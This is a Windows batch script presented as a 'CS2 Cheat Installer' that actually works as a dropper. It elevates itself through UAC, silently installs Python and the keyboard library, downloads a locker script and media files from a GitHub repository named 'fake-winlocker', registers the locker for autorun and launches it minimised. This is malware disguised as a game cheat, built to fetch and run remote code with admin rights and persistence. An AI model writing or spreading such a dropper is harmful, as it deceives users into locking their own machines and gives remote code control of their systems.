@echo off
setlocal EnableExtensions EnableDelayedExpansion
title CS2 Cheat Installer

rem --- UAC ---
net session >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

rem --- рабочая папка ---
set "WORKDIR=C:\CyberHack"
if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

set "SCRIPT=%WORKDIR%\cyberhack.py"
set "START=%WORKDIR%\start.b64"
set "SOUND=%WORKDIR%\sound.b64"
set "VOICE=%WORKDIR%\voice.b64"
set "CORRECT=%WORKDIR%\correct.b64"
set "WRONG=%WORKDIR%\wrong.b64"
set "BASE=https://raw.githubusercontent.com/xerobrin9908-blip/fake-winlocker/refs/heads/main"

rem --- Python ---
set "PYTHON_EXE="
where python >nul 2>&1
if not errorlevel 1 (
    set "PYTHON_EXE=python"
    goto :python_ok
)

echo [*] Python not found. Downloading...
set "PY_INSTALLER=%TEMP%\python_installer.exe"
set "PY_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%PY_URL%' -OutFile '%PY_INSTALLER%' -UseBasicParsing"
if not exist "%PY_INSTALLER%" ( echo [ERROR] Python download failed. & pause & exit /b 1 )

"%PY_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1
if errorlevel 1 ( echo [ERROR] Python install failed. & pause & exit /b 1 )

set "PATH=%PATH%;%ProgramFiles%\Python311;%ProgramFiles%\Python311\Scripts"
where python >nul 2>&1
if errorlevel 1 ( echo [ERROR] Python not in PATH. & pause & exit /b 1 )
set "PYTHON_EXE=python"

:python_ok
echo [OK] Python ready.

echo [*] Installing keyboard...
%PYTHON_EXE% -m pip install keyboard >nul 2>&1
if errorlevel 1 ( echo [ERROR] pip install keyboard failed. & pause & exit /b 1 )
echo [OK] keyboard installed.

rem --- Download ---
call :download "%BASE%/Locker.py" "%SCRIPT%"
call :download "%BASE%/start.b64" "%START%"
call :download "%BASE%/sound1.b64" "%SOUND%"
call :download "%BASE%/voice.b64" "%VOICE%"
call :download "%BASE%/correct.b64" "%CORRECT%"
call :download "%BASE%/wrong.b64" "%WRONG%"

rem --- Автозагрузка через сам локер ---
echo [*] Installing autorun...
%PYTHON_EXE% "%SCRIPT%" --install
if errorlevel 1 ( echo [WARN] --install failed, continuing. )
echo [OK] Autorun installed.

rem --- Сразу запускаем локер ---
echo [*] Launching...
where pythonw >nul 2>&1
if not errorlevel 1 (
    start "" /min pythonw "%SCRIPT%"
) else (
    start "" /min python "%SCRIPT%"
)

echo [OK] Done. Press any key to close.
pause >nul
exit /b 0

:download
set "URL=%~1"
set "OUT=%~2"
echo [*] Downloading %~nx2...
if exist "%OUT%" del /f /q "%OUT%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUT%' -UseBasicParsing"
if not exist "%OUT%" ( echo [WARN] %~nx2 not downloaded. )
exit /b 0
